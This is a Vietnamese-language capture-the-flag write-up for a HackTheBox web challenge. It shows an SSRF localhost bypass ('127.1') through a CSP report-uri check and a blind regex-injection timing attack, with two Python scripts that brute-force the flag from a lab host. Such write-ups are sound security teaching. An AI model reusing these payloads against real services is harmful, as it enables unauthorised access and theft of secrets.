---
layout: post
title: HTB ExpressionalRebel Writeup
date: 2022-12-01
categories: ["hackthebox"]
---

# Phân tích code

Vì đề bài cho source code nên mình sẽ tiến hành phần tích mã nguồn để xem ứng dụng có những chức năng gì và luồng của code như thế nào.

Ứng dụng này được viết bằng nodejs. Mình sẽ đọc thư mục routes trước để xem ứng dụng có những chức năng và đường dẫn nào.

Trong thư mục routes có 2 file api.js và index.js. Với file index.js có 2 hàm home page và deactivate page.

![Imgur](https://i.imgur.com/xOY0Jwx.png)

Chức năng homepage chỉ để hiển thị các thông tin. Còn chức năng deactivate thì có 1 input là ```secretCode```. Biến ```secretCode``` thì được vavalidate bởi hàm ```validateSecret```. Mình sẽ xem hàm ```validateSecret``` sẽ thực hiện điều gì.

```javascript
const validateSecret = async (secret) => {
    try {
        const match = await regExp.match(secret, env.FLAG)
        return !!match;
    } catch (error) {
        return false;
    }
}
```

Hàm này sẽ thực hiện kiểm tra regex nếu input `secret` có khớp với `env.FLAG` hay không.

Tuy nhiên, quay lại chức năng ```deactivate```, chức năng này có hàm ```isLocal```.

![Imgur](https://i.imgur.com/dy8dcNN.png)

Hàm isLocal kiểm tra xem ```remoteAddress``` có phải từ 127.0.0.1 và ```host``` là 127.0.0.1:1337 hay không. Vì vậy, điều đó có nghĩa là chức năng này chỉ có thể truy cập được từ localhost.

Tiếp theo mình tiến hành phân tích tệp api.js.

![Imgur](https://i.imgur.com/b7kpkK2.png)

Chức năng evaluate sẽ thực hiện nhận các input ```csp``` sau đó sẽ được kiểm tra bởi hàm ```evaluateCsp```.

![Imgur](https://i.imgur.com/x6OlxTs.png)

Hàm ```evaluateCsp``` sẽ thực hiện phân tích cú pháp của CSP và nếu đầu vào có report-uri, nó sẽ được kiểm tra bởi hàm ```checkReportUri```.

Trong CSP thì report-uri sẽ được đi kèm với các url. Mọi người có thể tìm hiểu thêm trong link sau: 

- [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri)

```
Content-Security-Policy: report-uri <uri>;
Content-Security-Policy: report-uri <uri> <uri>;
```

Hàm checkReportUri như sau

![Imgur](https://i.imgur.com/F1XUa8S.png)

Hàm ```checkReportUri``` sẽ thực hiện kiểm tra xem có mấy URI và kiểm tra xem URI đã gửi có phải là 127.0.0.1 hay localhost từ hàm ```isLocalhost``` hay không.

![Imgur](https://i.imgur.com/2rN4Jb0.png)

Nếu tất cả các điều kiện được đáp ứng, hàm ```httpGet``` sẽ được thực thi tới URI đó.

![Imgur](https://i.imgur.com/CQ1D1d0.png)

Hàm ```httpGet``` sẽ thực hiện truy cập vào URI đó.

# Exploit

Trước tiên, mình sẽ gửi yêu cầu qua API để kiểm tra xem response nhận được là gì.

![Imgur](https://i.imgur.com/qdHYGHI.png)

Tiếp theo mình sẽ gửi thông tin report-uri với uri là 127.0.0.1.

![Imgur](https://i.imgur.com/2OT8roZ.png)

Mình nhận được các thông báo lỗi. Vì vậy, mình phải bypass chức năng kiểm tra ```isLocalhost``` của evaluate. Để ứng dụng có thể truy cập vào được 127.0.0.1.

Thế là mình nghĩ ngay cách bypass giống như lỗ hổng SSRF.

![Imgur](https://i.imgur.com/FoRJ3u7.png)

Cách trên có thể bypass hàm ```isLocalhost```` một cách dễ dàng. Đây là kết quả mình đã nhận được.

![Imgur](https://i.imgur.com/G89yQRb.png)

Vậy làm thế nào để có được flag. Quay lại hàm ```deactivate ```, trong hàm ```validateSecret``` có một regex kiểm tra xem secret có khớp với flag hay không. Và chức năng request chỉ có thể truy cập qua localhost.

Kết hợp với chức năng ```evaluate```, mình có thể truy cập chức năng ```deactivate``` bằng cách bypass ở trên.

![Imgur](https://i.imgur.com/Ke2dyWM.png)

Tuy nhiên, mình không thấy bất cứ điều gì xảy ra.

Với dữ liệu secret regex với flag, mình đã tìm kiếm các thông tin trên google. Sau một thời gian, mình đã tìm ra đây là lỗ hổng Blind Regular Expression Injection và có 1 cách khai thác nhưu sau.

- [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
- [https://diary.shift-js.info/blind-regular-expression-injection/](https://diary.shift-js.info/blind-regular-expression-injection/)

Theo thông tin mình đọc được thì khi input đoạn regex ```^(?=.\{1\})((.))*salt$``` nếu ra kết quả đúng thì request sẽ mất hơn 2s để thực hiện. Và nếu sai, yêu cầu sẽ thực hiện rất nhanh.

![Imgur](https://i.imgur.com/CKjF82e.png)

vậy mình sẽ code 1 đoạn khai thác tìm kiếm chiều dài của flag trước tiên.

```python
import requests, urllib, time

url = "http://178.128.174.134:32093/api/evaluate"

def brute_flag():
    length_of_flag = 0
    for i in range(100):
        secret_code = urllib.parse.quote_plus(f'^(?=HTB\{\{.\{\{\{i\}\}\}\}\})((.*)*)*salt$')

        headers = {'Content-Type': 'application/json'}
        data = {'csp': f'report-uri http://127.1:1337/deactivate?secretCode={secret_code}\n'}
        response = requests.post(url, headers=headers, json=data)
        if response.elapsed.total_seconds() > 2:
            length_of_flag = i
            break
        
    print("length flag is: \%s " \% str(length_of_flag))
if __name__ == "__main__":
    brute_flag()
```

Kết quả mình nhận được chiều dài flag là 34:

![Imgur](https://i.imgur.com/yM2nNQw.png)

Sau đó mình thực hiện brute flag

```python
import requests, urllib, time

url = "http://178.128.174.134:32093/api/evaluate"

def brute_force_flag():
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

    flag = ""
    for i in range(34):
        for i in range(len(alphabet)):
            secret_code = urllib.parse.quote_plus(f'^(?=HTB\{\{\{flag\}\{alphabet[i]\}.*\}\})((.*)*)*salt$')

            headers = {'Content-Type': 'application/json'}
            data = {'csp': f'report-uri http://127.1:1337/deactivate?secretCode={secret_code}\n'}

            response = requests.post(url, headers=headers, json=data)
            if response.elapsed.total_seconds() > 2:
                flag = flag + alphabet[i]
                break

    print("flag is: HTB\{\%s\}" \% str(flag))
if __name__ == "__main__":
    brute_force_flag()
```

Sau khi chạy xong mình đã có được flag

![Imgur](https://i.imgur.com/9rZbEQo.png)
